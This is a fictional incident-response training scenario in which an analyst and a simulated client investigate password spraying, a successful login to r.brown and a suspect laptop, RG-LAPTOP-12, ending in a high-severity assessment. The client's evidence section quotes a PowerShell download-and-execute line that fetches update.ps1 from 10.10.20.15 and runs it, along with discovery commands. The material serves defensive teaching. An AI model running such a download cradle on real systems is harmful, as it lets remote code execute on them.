# Simulated Client Interactions — INC-005

> **Portfolio training scenario:** The client, company, users, timestamps, and communications below are fictional and were created to simulate a realistic security investigation engagement.

---

## Client — Initial Request

**Client:** Redgum Accounting Pty Ltd

> Hi,
>
> We've noticed some unusual login activity involving one of our Windows computers.
>
> One employee reported that their account was temporarily locked, and our IT administrator has also noticed a number of failed login attempts.
>
> We're not sure if this is simply someone entering the wrong password repeatedly or if there's a security issue.
>
> Could you review the Windows security events and provide a short investigation covering what happened, which accounts may be affected, the source IP, severity, and recommended next steps?
>
> We can provide additional logs if required.

---

## Analyst — Initial Triage Response

> Thanks. I'll start by establishing a timeline from the authentication events and correlating the source IP, targeted accounts, timestamps, and logon types.
>
> I'll distinguish confirmed observations from hypotheses and will identify any additional telemetry required before making a final severity assessment.

---

## Client — Additional Authentication Evidence

> We've pulled additional events from the domain controller.
>
> The failed authentication attempts weren't just against one account. We can see several different users being targeted from the same internal IP within a short period.
>
> There's also a successful authentication to `r.brown` from the same source.
>
> We spoke with John Smith, and he says he wasn't using his laptop at the time.

---

## Analyst — Updated Assessment

> The activity is more consistent with password spraying than traditional brute-force activity against a single account.
>
> The successful authentication to `r.brown` increases the likelihood of credential compromise and should be investigated as a priority.
>
> I recommend identifying the source system associated with `192.168.1.44` and reviewing endpoint telemetry around the successful authentication.

---

## Client — Endpoint Identification

> We identified `192.168.1.44` as `RG-LAPTOP-12`, which is assigned to John Smith.
>
> John confirmed he wasn't using the laptop during the activity. The laptop was physically in the office.

---

## Analyst — Endpoint Evidence Request

> That increases concern that the endpoint may have been operating under unauthorised control.
>
> Please preserve the endpoint and provide process-creation telemetry and PowerShell logging for the relevant time period.
>
> In particular, I'd like to determine what PowerShell actually executed rather than assuming that PowerShell itself indicates malware.

---

## Client — Process Telemetry

> We found a PowerShell process followed by `cmd.exe` and `whoami.exe`.
>
> There are also PowerShell Script Block Logging events from the same timeframe.

---

## Analyst — Follow-Up Request

> Please provide the complete Event ID 4104 Script Block contents and, if possible, the command-line details from the corresponding Event ID 4688 process events.
>
> The key question is whether PowerShell was executing locally generated administrative commands or retrieving and executing external content.

---

## Client — PowerShell Evidence

> We found the following:

```powershell
$u = "http://10.10.20.15/update.ps1"
IEX (New-Object Net.WebClient).DownloadString($u)
```

> A second event contains:

```powershell
Get-Process
Get-Service
whoami /all
```

---

## Analyst — Final Assessment

> This significantly increases the severity of the incident.
>
> The evidence now indicates that PowerShell retrieved remote content and passed it to `Invoke-Expression` for execution, followed by process, service, and security-context discovery.
>
> I recommend immediately isolating `RG-LAPTOP-12`, protecting potentially compromised credentials, preserving the endpoint evidence, and investigating `10.10.20.15`.
>
> At this stage I would classify the incident as **High severity**.
>
> I would escalate it to Critical if further evidence confirms persistence, privileged account compromise, lateral movement, confirmed malicious payload execution, sensitive data access/exfiltration, or significant business impact.

---

## Client — Requested Next Steps

> Understood. We'll isolate the laptop and preserve the logs before reimaging it.
>
> We'll also have the domain administrator review `r.brown` and the other accounts targeted by the login attempts.
>
> We'll identify what system owns `10.10.20.15` and provide the `update.ps1` file for analysis if we can retrieve it safely.

---

## Engagement Status

**Current status:** Contained pending further forensic investigation.

### Outstanding questions

* What is contained in `update.ps1`?
* Is `10.10.20.15` authorised?
* How was `RG-LAPTOP-12` compromised?
* Were credentials harvested?
* Was `r.brown` compromised?
* Was persistence established?
* Did lateral movement occur?
* Was sensitive data accessed?
* Are additional endpoints affected?
